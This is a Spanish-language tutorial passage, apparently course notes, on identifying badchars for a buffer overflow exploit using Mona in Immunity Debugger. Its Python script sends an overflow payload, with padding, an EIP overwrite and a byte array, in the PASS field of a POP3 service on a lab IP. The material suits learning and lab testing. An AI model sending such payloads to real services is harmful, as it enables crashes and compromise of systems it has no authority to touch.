En la generación de nuestro shellcode malicioso para la explotación del buffer overflow, es posible que algunos caracteres no sean interpretados correctamente por el programa objetivo. Estos caracteres se conocen como “**badchars**” y pueden causar que el shellcode falle o que el programa objetivo se cierre inesperadamente.

Para evitar esto, es importante identificar y eliminar los badchars del shellcode. En esta clase, veremos cómo desde Immunity Debugger podremos aprovechar la funcionalidad **Mona** para generar diferentes bytearrays con casi todos los caracteres representados, y luego identificar los caracteres que el programa objetivo no logra interpretar.

Una vez identificados los badchars, se pueden descartar del shellcode final y generar un nuevo shellcode que no contenga estos caracteres. Para identificar los badchars, se pueden utilizar diferentes técnicas, como la introducción de diferentes bytearrays con caracteres hexadecimales consecutivos, que permiten identificar los caracteres que el programa objetivo no logra interpretar.

Estos caracteres irán representados en la pila (**ESP**), que será donde veremos qué caracteres son los que no están siendo representados, identificando así los badchars.![[Screenshot (24).png]]

![[Screenshot (25).png]]

```python
#!/usr/bin/python3
   2   │ 
   3   │ import socket
   4   │ import sys
   5   │ 
   6   │ #Variables globales
   7   │ 
   8   │ ip_address = "10.47.1.42"
   9   │ lport = 110
  10   │ offset = 4655
  11   │ 
  12   │ before_eip = b"A"*offset
  13   │ 
  14   │ eip = b"B"*4
  15   │ after_eip = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  16   │       b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  17   │       b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  18   │       b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  19   │       b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  20   │       b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  21   │       b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  22   │       b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff") 
  23   │ 
  24   │ 
  25   │ payload = before_eip + eip + after_eip
  26   │ 
  27   │ def exploit():
  28   │ 
  29   │     # Create a socket
  30   │     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  31   │ 
  32   │     # Connect to the server
  33   │ 
  34   │     s.connect((ip_address, lport))
  35   │     
  36   │     # Revice the banner
  37   │      
  38   │     banner = s.recv(1024)
  39   │ 
  40   │     s.send(b"USER lotus" + b'\r\n')
  41   │     response = s.recv(1024)
  42   │     s.send(b"PASS" + payload + b'\r\n')
  43   │     s.close()
  44   │ 
  45   │ if __name__ == "__main__":
  46   │     exploit()    
```

